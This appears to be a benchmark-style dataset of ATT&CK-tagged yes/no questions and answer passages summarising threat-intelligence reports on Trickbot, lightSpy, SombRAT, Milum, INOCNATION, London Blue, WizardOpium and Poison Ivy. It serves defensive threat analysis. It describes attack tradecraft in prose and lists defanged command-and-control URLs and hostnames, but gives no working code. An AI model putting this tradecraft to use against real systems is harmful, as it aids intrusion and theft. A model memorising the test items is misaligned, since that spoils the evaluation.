Collection: Trickbot uses a point-of-sale (PoS) extraction module called psfin32 to identify PoS-related terms in the domain of interest. It also drops shadnewdll, a proxy module that intercepts and modifies web traffic to create fraudulent bank transactions.
Command and Control: The malware connects to a URL (hxxps://185[.]159[.]82[.]15/hollyhole/c644[.]php) to download its payload. If the file is executable, it is saved and executed from the %Temp% directory. If not, it is saved as a .cro file, decoded using certutil.exe, and then executed.
Others: The Trickbot campaign primarily affected the United States and also targeted China, Canada, and India. The spam emails falsely claim to be subscription notifications and prompt users to view an attached document containing the malicious script. Trend Micro's security solutions can detect and block the malicious files and URLs associated with this campaign. Indicators of Compromise (IoCs) include various SHA-256 hashes and the URL used for downloading the Trickbot payload.",Yes,Latest Trickbot Campaign Delivered via Highly Obfuscated JS File 
482,16,16-Credential Access-T1555-Credentials from Password Stores,"After Trickbot checks the total number of running processes to evade detection and avoids execution in virtual or sandbox environments, is it likely that Trickbot will subsequently target applications such as Filezilla and Microsoft Outlook to steal credentials and information from these platforms?","Credential Access: This variant of Trickbot is capable of stealing credentials and information from applications such as Filezilla, Microsoft Outlook, PuTTy, Remote Desktop (RDP), VNC, WinSCP, and internet browsers including Google Chrome, Internet Explorer, Microsoft Edge, and Mozilla Firefox. It gathers data such as autofills, billing information, browsing history, credit card data, HTTP POST responses, internet cookies, usernames, and passwords.","Initial Access: The Trickbot banking trojan campaign initiates with spam emails containing a Microsoft Word document with an enabled macro. When the document is opened, it drops a heavily obfuscated JavaScript (JS) file designed to download Trickbot as its payload.
Execution: The obfuscated JS file, once executed, displays a fake Microsoft error to mislead the user while the script runs in the background. It creates a copy of itself in the Startup folder as Shell.jse for persistence.
Persistence: For persistence, Trickbot creates a copy of itself in the Startup folder as Shell.jse.
Defense Evasion: Trickbot exhibits anti-analysis characteristics by checking the total number of running processes on the victim's machine to evade detection. It assumes a virtual or sandbox environment if the process count is below a certain threshold and will not proceed with execution. It also checks for specific analysis-related processes and usernames.
Collection: Trickbot uses a point-of-sale (PoS) extraction module called psfin32 to identify PoS-related terms in the domain of interest. It also drops shadnewdll, a proxy module that intercepts and modifies web traffic to create fraudulent bank transactions.
Command and Control: The malware connects to a URL (hxxps://185[.]159[.]82[.]15/hollyhole/c644[.]php) to download its payload. If the file is executable, it is saved and executed from the %Temp% directory. If not, it is saved as a .cro file, decoded using certutil.exe, and then executed.
Impact: Trickbot deletes files with specific extensions located in removable and network drives, replacing them with a copy of the malware. The targeted file extensions include those used by Microsoft Office and OpenDocument formats.
Others: The Trickbot campaign primarily affected the United States and also targeted China, Canada, and India. The spam emails falsely claim to be subscription notifications and prompt users to view an attached document containing the malicious script. Trend Micro's security solutions can detect and block the malicious files and URLs associated with this campaign. Indicators of Compromise (IoCs) include various SHA-256 hashes and the URL used for downloading the Trickbot payload.",Yes,Latest Trickbot Campaign Delivered via Highly Obfuscated JS File 
486,160,160-Execution-T1059-Command and Scripting Interpreter,"After users are lured into visiting legitimate news sites via malicious watering hole links and lightSpy malware exploits vulnerabilities in iOS devices for initial access, is it likely that the modular backdoor will enable remote command execution and file manipulation on the infected device during its execution phase before utilizing signed payloads and kernel exploits for defense evasion?","Execution: The lightSpy malware, once executed, installs a modular backdoor capable of remote command execution and file manipulation on the infected iOS device. This allows the attacker to spy on the user and take full control of the device. The malware's modules are designed for data exfiltration, including WiFi history, contacts, GPS location, hardware information, iOS keychain, phone call history, Safari and Chrome browser history, and SMS messages. Network environment information such as available WiFi networks and local network IP addresses are also exfiltrated. Specific messenger applications like Telegram, QQ, and WeChat are targeted for data exfiltration.","Initial Access: A watering hole attack targeting iOS users in Hong Kong was identified by Trend Micro on February 19. Malicious links posted on multiple forums led users to legitimate news sites while simultaneously loading and executing malicious code through a hidden iframe. This code exploited vulnerabilities in iOS 12.1 and 12.2, resulting in the download of a new iOS malware variant named lightSpy (IOS_LightSpy.A).
Defense Evasion: The lightSpy malware employs a sophisticated spyware that maintains control over the device and exfiltrates information. It uses a modular design with capabilities for module updates, remote command dispatch per module, and complete shell command execution. The malware's modules are explicitly designed for data exfiltration, targeting information from Telegram, WeChat, and other apps. The infection chain involves a silently patched Safari bug and a customized kernel exploit to gain root privileges, exploiting CVE-2019-8605. The payload.dylib file is signed with a legitimate Apple developer certificate, indicating the campaign's activity started around November 29, 2019.
Collection: The lightSpy malware's modules are designed to collect and exfiltrate a wide range of data from the infected device, including hardware information, contacts, text messages, call history, saved WiFi information, browser history, and user location. Specific modules target data from messenger apps like WeChat, QQ, and Telegram.
Command and Control: The lightSpy malware contains hardcoded locations of the C&C server within its modules. The main control module, light, is capable of loading and updating other modules, which are designed to extract and exfiltrate different types of data.
Others: A similar campaign targeting Android devices, named dmsSpy (AndroidOS_dmsSpy.A.), was discovered in 2019. Malicious APK files were distributed via public Hong Kong-related Telegram channels, claiming to be legitimate apps but designed to exfiltrate device information, contacts, and SMS messages. The dmsSpy malware was advertised as a calendar app containing protest schedules in Hong Kong, requesting sensitive permissions and transmitting information to a C&C server. Debug mode left activated by the threat actors revealed additional capabilities, including screenshots and the ability to install APK files onto the device. The download and command-and-control servers for dmsSpy used the same domain name (hkrevolution[.]club) as one of the watering holes used by the iOS component of Poisoned News, suggesting the same threat actors are behind both campaigns.",Yes,Operation Poisoned News_ Hong Kong Users Targeted With Mobile Malware via Local News Links - TrendLabs Security Intelligence Blog
491,160,160-Command and Control-T1071-Application Layer Protocol,"After the lightSpy malware performs data collection by targeting hardware information, contacts, browser history, and messenger app data such as WeChat, QQ, and Telegram, is it likely to leverage hardcoded C&C server locations for module updates and data exfiltration via its main control module, light?","Command and Control: The lightSpy malware contains hardcoded locations of the C&C server within its modules. The main control module, light, is capable of loading and updating other modules, which are designed to extract and exfiltrate different types of data.","Initial Access: A watering hole attack targeting iOS users in Hong Kong was identified by Trend Micro on February 19. Malicious links posted on multiple forums led users to legitimate news sites while simultaneously loading and executing malicious code through a hidden iframe. This code exploited vulnerabilities in iOS 12.1 and 12.2, resulting in the download of a new iOS malware variant named lightSpy (IOS_LightSpy.A).
Execution: The lightSpy malware, once executed, installs a modular backdoor capable of remote command execution and file manipulation on the infected iOS device. This allows the attacker to spy on the user and take full control of the device. The malware's modules are designed for data exfiltration, including WiFi history, contacts, GPS location, hardware information, iOS keychain, phone call history, Safari and Chrome browser history, and SMS messages. Network environment information such as available WiFi networks and local network IP addresses are also exfiltrated. Specific messenger applications like Telegram, QQ, and WeChat are targeted for data exfiltration.
Defense Evasion: The lightSpy malware employs a sophisticated spyware that maintains control over the device and exfiltrates information. It uses a modular design with capabilities for module updates, remote command dispatch per module, and complete shell command execution. The malware's modules are explicitly designed for data exfiltration, targeting information from Telegram, WeChat, and other apps. The infection chain involves a silently patched Safari bug and a customized kernel exploit to gain root privileges, exploiting CVE-2019-8605. The payload.dylib file is signed with a legitimate Apple developer certificate, indicating the campaign's activity started around November 29, 2019.
Collection: The lightSpy malware's modules are designed to collect and exfiltrate a wide range of data from the infected device, including hardware information, contacts, text messages, call history, saved WiFi information, browser history, and user location. Specific modules target data from messenger apps like WeChat, QQ, and Telegram.
Others: A similar campaign targeting Android devices, named dmsSpy (AndroidOS_dmsSpy.A.), was discovered in 2019. Malicious APK files were distributed via public Hong Kong-related Telegram channels, claiming to be legitimate apps but designed to exfiltrate device information, contacts, and SMS messages. The dmsSpy malware was advertised as a calendar app containing protest schedules in Hong Kong, requesting sensitive permissions and transmitting information to a C&C server. Debug mode left activated by the threat actors revealed additional capabilities, including screenshots and the ability to install APK files onto the device. The download and command-and-control servers for dmsSpy used the same domain name (hkrevolution[.]club) as one of the watering holes used by the iOS component of Poisoned News, suggesting the same threat actors are behind both campaigns.",Yes,Operation Poisoned News_ Hong Kong Users Targeted With Mobile Malware via Local News Links - TrendLabs Security Intelligence Blog
499,161,161-Discovery-T1057-Process Discovery,"After employing PowerShell injection techniques via the Invoke-ReflectivePEInjection PowerSploit module for execution, is the CostaRicto Campaign likely to use the SombRAT backdoor for process discovery, system information discovery, and system time discovery before using tools like pscan and nmap for network service scanning?","Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.","Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.
Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
501,161,161-Discovery-T1124-System Time Discovery,"After utilizing defense evasion techniques such as process injection and deobfuscation to decode information related to the SombRAT backdoor, is it likely that the CostaRicto Campaign's SombRAT malware will employ its process discovery and system time discovery capabilities before archiving collected data using a custom storage file format?","Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.","Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.
Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
504,161,161-Command and Control-T1572-Protocol Tunneling,"After the CostaRicto Campaign's SombRAT backdoor performed process discovery and system information discovery during the Discovery phase, is it likely that the backdoor would communicate with C2 servers using protocol tunneling over DNS and HTTP to establish a Command and Control channel?","Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.","Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
507,161,161-Command and Control-T1090-Proxy,"After the SombRAT backdoor performs process discovery and system information discovery during the Discovery phase, is it likely that it will communicate with C2 servers using proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY to implement protocol tunneling over DNS and HTTP?","Command and Control: The CostaRicto Campaign's SombRAT backdoor communicated with C2 servers using protocol tunneling over DNS and HTTP. The traffic was SSL-encrypted and capable of bypassing HTTP/SOCKS5 proxies. The C2 domain name was hardcoded in the binary and obfuscated. RSA encryption was used to secure the AES key exchange for C2 traffic. Proxy tools like pcheck HTTP/S proxy, GO SOCKS5 proxy, and PuTTY were also used.","Initial Access: The CostaRicto Campaign, identified by the BlackBerry Research and Intelligence Team, leveraged stolen credentials to gain initial access to victims' environments. The attackers utilized SSH tools to set up remote tunneling, redirecting traffic from malicious domains to a proxy listening on a local port. The tunnel authentication was performed using the attackers' private keys. Payload stagers, either HTTP or reverse-DNS, were executed using scheduled tasks to download the backdoor.
Execution: The CostaRicto Campaign executed malicious code through various methods. The 64-bit backdoor was deployed using scripts and encrypted files, with a PowerShell loader based on the Invoke-ReflectivePEInjection PowerSploit module to inject the final payload DLL into memory. The 32-bit backdoor utilized a custom VM-based payload loader, CostaBricks, which implemented a simple virtual machine mechanism to decode and inject the payload into memory.
Defense Evasion: The CostaRicto Campaign employed defense evasion techniques such as process injection using the Invoke-ReflectivePEInjection PowerSploit module and deobfuscation to decode files or information related to the SombRAT backdoor.
Discovery: The SombRAT backdoor, part of the CostaRicto Campaign, had capabilities for process discovery, system information discovery, and system time discovery. Additionally, tools like pscan and nmap were used for network service scanning.
Collection: The CostaRicto Campaign's SombRAT backdoor archived collected data using a custom storage file format.
Exfiltration: The SombRAT backdoor exfiltrated data over the C2 channel.",Yes,The CostaRicto Campaign_ Cyber-Espionage Outsourced
511,162,162-Command and Control-T1071-Application Layer Protocol,"After using HKCU autorun system registry keys Run and RunOnce to ensure persistence during system restarts, is it likely that the Milum Trojan will use JSON configuration data and transmit command and control (C2) communications via HTTP POST requests as part of its operation?","Command and Control: The Milum Trojan uses JSON configuration data for command and control (C2) communications, which are transmitted via HTTP POST requests. The data is compressed with gzip, base64-encoded, and encrypted with RC4. The C2 infrastructure includes rented virtual private servers and a domain registered with an anonymization service. The Trojan's configuration data contains various parameters, including client IDs and encryption keys, which are unique to each target and facilitate communication with the C2 servers.","Execution: On March 27, 2020, Denis Legezo from Kaspersky reported on a malicious campaign named WildPressure, which distributes a C++ Trojan called Milum. The Trojan, originally named Milum46_Win32.exe, is compiled as a standalone PE file and contains zlib compression functions for C2 communication. It uses base64-encoded JSON data for configuration, which includes C2 URLs, timeouts, and RC4 keys. The Trojan transmits compressed JSON data in HTTP POST requests, encrypted with RC4. Persistence is achieved through HKCU autorun system registry keys Run and RunOnce. The malware was first observed targeting organizations in the Middle East, particularly those related to the industrial sector, with no infections registered before May 31, 2019. The compilation timestamps for the samples are consistent, dated March 2019. The campaign infrastructure utilized rented OVH and Netzbetrieb VPS and a domain registered with Domains by Proxy. Kaspersky products detect this malware as Backdoor.Win32.Agent.
Persistence: The WildPressure campaign uses the Milum Trojan to maintain persistence on infected systems. It achieves this by utilizing HKCU autorun system registry keys Run and RunOnce. The Trojan is designed to survive system restarts and maintain its foothold on compromised systems.
Others: The WildPressure campaign, attributed to the Milum Trojan, targets industrial-related entities in the Middle East. The campaign does not show code similarities with known campaigns, and the attacks are considered targeted. The malware version, indicated as 1.0.1, suggests an early stage of development. The RC4 encryption algorithm is used with different 64-byte keys for different victims. The malware exports zlib compression functions, which are unnecessary for a standalone application, indicating potential plans for non-C++ versions. The campaign operators use target IDs found in the samples, such as HatLandM30 and HatLandid3. The Trojan can execute commands, handle files, and gather system information. The C2 domain sinkholing revealed active infections primarily from the Middle East. The attackers' identity remains unknown, with no strong code- or victim-based similarities to any known actor. The spreading mechanism of Milum is not yet known, and the campaign's targeting may be limited by visibility. The malware could potentially be reused in other operations. Indicators of compromise include specific file MD5 hashes and URLs associated with the campaign.",Yes,WildPressure targets industrial-related entities in the Middle East _ Securelist
513,162,162-Command and Control-T1573-Encrypted Channel,"After achieving persistence through HKCU autorun system registry keys like Run and RunOnce, is the Milum Trojan likely to use JSON configuration data for command and control (C2) communication via an encrypted channel?","Command and Control: The Milum Trojan uses JSON configuration data for command and control (C2) communications, which are transmitted via HTTP POST requests. The data is compressed with gzip, base64-encoded, and encrypted with RC4. The C2 infrastructure includes rented virtual private servers and a domain registered with an anonymization service. The Trojan's configuration data contains various parameters, including client IDs and encryption keys, which are unique to each target and facilitate communication with the C2 servers.","Execution: On March 27, 2020, Denis Legezo from Kaspersky reported on a malicious campaign named WildPressure, which distributes a C++ Trojan called Milum. The Trojan, originally named Milum46_Win32.exe, is compiled as a standalone PE file and contains zlib compression functions for C2 communication. It uses base64-encoded JSON data for configuration, which includes C2 URLs, timeouts, and RC4 keys. The Trojan transmits compressed JSON data in HTTP POST requests, encrypted with RC4. Persistence is achieved through HKCU autorun system registry keys Run and RunOnce. The malware was first observed targeting organizations in the Middle East, particularly those related to the industrial sector, with no infections registered before May 31, 2019. The compilation timestamps for the samples are consistent, dated March 2019. The campaign infrastructure utilized rented OVH and Netzbetrieb VPS and a domain registered with Domains by Proxy. Kaspersky products detect this malware as Backdoor.Win32.Agent.
Persistence: The WildPressure campaign uses the Milum Trojan to maintain persistence on infected systems. It achieves this by utilizing HKCU autorun system registry keys Run and RunOnce. The Trojan is designed to survive system restarts and maintain its foothold on compromised systems.
Others: The WildPressure campaign, attributed to the Milum Trojan, targets industrial-related entities in the Middle East. The campaign does not show code similarities with known campaigns, and the attacks are considered targeted. The malware version, indicated as 1.0.1, suggests an early stage of development. The RC4 encryption algorithm is used with different 64-byte keys for different victims. The malware exports zlib compression functions, which are unnecessary for a standalone application, indicating potential plans for non-C++ versions. The campaign operators use target IDs found in the samples, such as HatLandM30 and HatLandid3. The Trojan can execute commands, handle files, and gather system information. The C2 domain sinkholing revealed active infections primarily from the Middle East. The attackers' identity remains unknown, with no strong code- or victim-based similarities to any known actor. The spreading mechanism of Milum is not yet known, and the campaign's targeting may be limited by visibility. The malware could potentially be reused in other operations. Indicators of compromise include specific file MD5 hashes and URLs associated with the campaign.",Yes,WildPressure targets industrial-related entities in the Middle East _ Securelist
515,162,162-Command and Control-T1090-Proxy,"After achieving persistence through the use of HKCU autorun system registry keys Run and RunOnce, is it likely that the Milum Trojan will use unique parameters within its configuration data to facilitate communication with the command and control (C2) servers?","Command and Control: The Milum Trojan uses JSON configuration data for command and control (C2) communications, which are transmitted via HTTP POST requests. The data is compressed with gzip, base64-encoded, and encrypted with RC4. The C2 infrastructure includes rented virtual private servers and a domain registered with an anonymization service. The Trojan's configuration data contains various parameters, including client IDs and encryption keys, which are unique to each target and facilitate communication with the C2 servers.","Execution: On March 27, 2020, Denis Legezo from Kaspersky reported on a malicious campaign named WildPressure, which distributes a C++ Trojan called Milum. The Trojan, originally named Milum46_Win32.exe, is compiled as a standalone PE file and contains zlib compression functions for C2 communication. It uses base64-encoded JSON data for configuration, which includes C2 URLs, timeouts, and RC4 keys. The Trojan transmits compressed JSON data in HTTP POST requests, encrypted with RC4. Persistence is achieved through HKCU autorun system registry keys Run and RunOnce. The malware was first observed targeting organizations in the Middle East, particularly those related to the industrial sector, with no infections registered before May 31, 2019. The compilation timestamps for the samples are consistent, dated March 2019. The campaign infrastructure utilized rented OVH and Netzbetrieb VPS and a domain registered with Domains by Proxy. Kaspersky products detect this malware as Backdoor.Win32.Agent.
Persistence: The WildPressure campaign uses the Milum Trojan to maintain persistence on infected systems. It achieves this by utilizing HKCU autorun system registry keys Run and RunOnce. The Trojan is designed to survive system restarts and maintain its foothold on compromised systems.
Others: The WildPressure campaign, attributed to the Milum Trojan, targets industrial-related entities in the Middle East. The campaign does not show code similarities with known campaigns, and the attacks are considered targeted. The malware version, indicated as 1.0.1, suggests an early stage of development. The RC4 encryption algorithm is used with different 64-byte keys for different victims. The malware exports zlib compression functions, which are unnecessary for a standalone application, indicating potential plans for non-C++ versions. The campaign operators use target IDs found in the samples, such as HatLandM30 and HatLandid3. The Trojan can execute commands, handle files, and gather system information. The C2 domain sinkholing revealed active infections primarily from the Middle East. The attackers' identity remains unknown, with no strong code- or victim-based similarities to any known actor. The spreading mechanism of Milum is not yet known, and the campaign's targeting may be limited by visibility. The malware could potentially be reused in other operations. Indicators of compromise include specific file MD5 hashes and URLs associated with the campaign.",Yes,WildPressure targets industrial-related entities in the Middle East _ Securelist
520,164,164-Defense Evasion-T1027-Obfuscated Files or Information,"After the INOCNATION campaign gains initial access by using a decoy installer for Cisco AnyConnect Mobility Client and executes a malicious DLL payload with anti-behavioral analysis techniques, is it likely that the campaign will utilize defense evasion tactics such as XOR obfuscation, sandbox detection, a mangled MZ header, and string stacking obfuscation, before establishing command and control through encrypted HTTPS via SSL/TLS connections with additional XOR encoding?","Defense Evasion: The INOCNATION campaign's malware exhibited several defense evasion techniques, including the use of XOR obfuscation for components and strings, sandbox detection, and a mangled MZ header to deceive security products. The malware also employed string stacking obfuscation with Unicode strings and multiple layers of obfuscation for its command and control traffic.","Initial Access: The INOCNATION campaign utilized a decoy installer for Cisco AnyConnect Mobility Client to facilitate initial access. The installer, disguised as a legitimate application, would execute regardless of the victim's decision to cancel the installation, silently creating and entrenching the malware into the system's background. The use of a widely recognized security application as an embedded decoy indicates a sophisticated ploy to deceive average users or less experienced system administrators.
Execution: The INOCNATION campaign's RAT installer executed a malicious DLL payload, which was obfuscated and rebuilt during installation. The malware employed anti-behavioral analysis techniques, such as comparing mouse cursor positions to detect sandbox environments. Additionally, the malware used a mangled MZ header to deceive security products and evade detection.
Persistence: The RAT installer set up a persistence mechanism for the payload malware by creating a registry key for entrenchment. This key would be referenced during the uninstall routine, indicating the malware's capability to maintain its foothold on the system.
Command and Control: The malware used encrypted HTTPS via SSL/TLS connections for command and control communications, employing Windows' standard SSL/TLS libraries. To further obfuscate the communications, the malware used a single-byte XOR encoding within the decrypted SSL/TLS communication. This additional layer of obfuscation was designed to thwart detection and analysis efforts, even in environments with SSL inspection devices.
Others: The INOCNATION campaign's malware was capable of receiving commands from its C2 server, including process execution, reverse shell, file activity, uploading and downloading files, system information retrieval, and uninstalling the malware. The uninstall command suggests that the threat actor aimed to maintain a limited number of victims by removing the tool when commanded. Fidelis Cybersecurity's products detect the activity documented in this report, and additional technical indicators are published on their GitHub repository. The malware samples analyzed in this report were shared by CrowdStrike.",Yes,FTA_1020_Fidelis_Inocnation_FINAL
527,165,165-Reconnaissance-T1597-Search Closed Sources,"After sending a test email from an attack account to validate successful delivery for their BEC campaign, is it likely that the London Blue group collects contact information of financial executives by using a commercial US-based lead service before attempting to evade defense mechanisms?","Reconnaissance: The London Blue group collected contact information for more than 500 financial executives, including Agari CFO Raymond Lim, using a commercial US-based lead service. This information was gathered as part of the initial preparation for BEC campaigns targeting California-based companies.","Initial Access: London Blue sent a test email from an attack email account to one of the group's central operational email addresses to verify successful delivery before launching their BEC campaign.
Defense Evasion: London Blue's BEC attempt against Agari CFO Raymond Lim was blocked by Agari Advanced Threat Protection.
Others: London Blue has evolved their tactics by targeting new parts of the world, including Asia, and using new tactics in their BEC campaigns. They have also started spoofing email addresses of target company CEOs to add authenticity to their attacks. The group has amassed a new targeting database of nearly 8,500 financial executives from almost 7,800 different companies worldwide. Most companies targeted using spoofing techniques do not have a DMARC record established, and those that do often have policies set to p=none, which does not prevent spoofed emails from reaching their targets.",Yes,london-blue-april-2019
533,166,166-Execution-T1203-Exploitation for Client Execution,"Before attackers utilized heap spraying techniques to gain an arbitrary read/write primitive and execute embedded shellcode payload, is it likely that malicious JavaScript code was inserted into a Korean-language news portal to redirect victims to an exploit landing page, exploiting CVE-2019-13720 in Google Chrome?","Execution: The exploit, CVE-2019-13720, used in Operation WizardOpium, involved a race condition bug between two threads in Google Chrome, leading to a Use-After-Free (UaF) condition that could result in code execution. The attackers attempted to trigger UaF to perform an information leak and create a deterministic heap layout, utilizing heap spraying techniques to reuse a freed pointer. This allowed the attackers to gain an arbitrary read/write primitive, craft a special object, and execute embedded shellcode payload.","Initial Access: The CTI report from Securelist, authored by AMR and GReAT, details an attack leveraging a zero-day exploit, CVE-2019-13720, in Google Chrome. The exploit was delivered through a waterhole-style injection on a Korean-language news portal, where a malicious JavaScript code was inserted into the main page to redirect victims to the exploit landing page. The attack, named Operation WizardOpium, involved a script that checked the victim's system for compatibility, specifically targeting 64-bit Windows systems and Chrome versions 65 or newer.
Persistence: For persistence, the malware installed tasks in the Windows Task Scheduler after the final payload was downloaded as an encrypted binary (worst.jpg), decrypted by the shellcode, and dropped as updata.exe to disk.
Command and Control: The main module of the malware, msdisp64.exe, was designed to download the next stage from a hardcoded command and control (C2) server set. The next stages were located on the C2 server in folders with the victim computer names, indicating that the threat actors had information about which machines were infected and placed the next stage modules in specific folders on the C2 server.
Others: The CTI report includes technical details such as the use of AJAX requests to download exploit code chunks, the use of RC4 for decryption, and the obfuscation of the browser exploit script. The report also mentions the use of BigInt for 64-bit arithmetic in JavaScript and the presence of debugging code left in the production code. Additionally, the report provides MD5 and SHA256 hashes for the files involved in the attack, as well as the domain names used by the attackers.",Yes,Chrome 0-day exploit CVE-2019-13720 used in Operation WizardOpium 
534,166,166-Persistence-T1053-Scheduled Task/Job,"After gaining initial access by exploiting a zero-day vulnerability (CVE-2019-13720) in Google Chrome through a waterhole-style attack and executing code via Use-After-Free (UaF) conditions with heap spraying, is it likely that the malware will establish persistence by installing tasks using Windows Task Scheduler before connecting to the C2 server and downloading next-stage modules specific to infected machines?","Persistence: For persistence, the malware installed tasks in the Windows Task Scheduler after the final payload was downloaded as an encrypted binary (worst.jpg), decrypted by the shellcode, and dropped as updata.exe to disk.","Initial Access: The CTI report from Securelist, authored by AMR and GReAT, details an attack leveraging a zero-day exploit, CVE-2019-13720, in Google Chrome. The exploit was delivered through a waterhole-style injection on a Korean-language news portal, where a malicious JavaScript code was inserted into the main page to redirect victims to the exploit landing page. The attack, named Operation WizardOpium, involved a script that checked the victim's system for compatibility, specifically targeting 64-bit Windows systems and Chrome versions 65 or newer.
Execution: The exploit, CVE-2019-13720, used in Operation WizardOpium, involved a race condition bug between two threads in Google Chrome, leading to a Use-After-Free (UaF) condition that could result in code execution. The attackers attempted to trigger UaF to perform an information leak and create a deterministic heap layout, utilizing heap spraying techniques to reuse a freed pointer. This allowed the attackers to gain an arbitrary read/write primitive, craft a special object, and execute embedded shellcode payload.
Command and Control: The main module of the malware, msdisp64.exe, was designed to download the next stage from a hardcoded command and control (C2) server set. The next stages were located on the C2 server in folders with the victim computer names, indicating that the threat actors had information about which machines were infected and placed the next stage modules in specific folders on the C2 server.
Others: The CTI report includes technical details such as the use of AJAX requests to download exploit code chunks, the use of RC4 for decryption, and the obfuscation of the browser exploit script. The report also mentions the use of BigInt for 64-bit arithmetic in JavaScript and the presence of debugging code left in the production code. Additionally, the report provides MD5 and SHA256 hashes for the files involved in the attack, as well as the domain names used by the attackers.",Yes,Chrome 0-day exploit CVE-2019-13720 used in Operation WizardOpium 
540,167,167-Command and Control-T1071-Application Layer Protocol,"After the PIVY variant evades defenses by using DLL sideloading to load the dropped DLL and modifying its configuration to confuse tools parsing configuration data, is it likely that the malware will communicate with Command & Control (C2) servers such as webserver.servehttp[.]com and admin.nslookupdns[.]com using application layer protocols?","Command and Control: The PIVY samples communicate with C2 servers such as webserver.servehttp[.]com and admin.nslookupdns[.]com. The IP resolved to by these hostnames overlapped with fileshare.serveftp[.]com, which was used in an earlier PIVY sample. The C2s are no longer null-padded, and each hostname ends with a null-byte followed by a string that changes slightly with each C2 server.","Initial Access: The infamous Remote Access Trojan (RAT) Poison Ivy (PIVY) has been observed targeting various Asian countries. A new variant, SPIVY, uses DLL sideloading and operates differently from a variant active for at least the past 12 months. The PIVY variant drops a decoy document, a DLL named ActiveUpdate.dll, and the PIVY shellcode file as Active.dat in a directory named ActiveUpdate_[0-9]{3}. It copies rundll32.exe to ActiveFlash.exe, executes the new file with the path to the DLL, and installs itself for automatic startup via a .lnk in the Windows Startup folder.
Execution: The PIVY variant copies rundll32.exe to ActiveFlash.exe and then executes the new file with the path to the DLL to perform its malicious actions. This deployment tactic has been used previously with different executable names for the rundll32 copy and the base directory name.
Persistence: The PIVY variant installs itself for automatic startup via a .lnk in the Windows Startup folder.
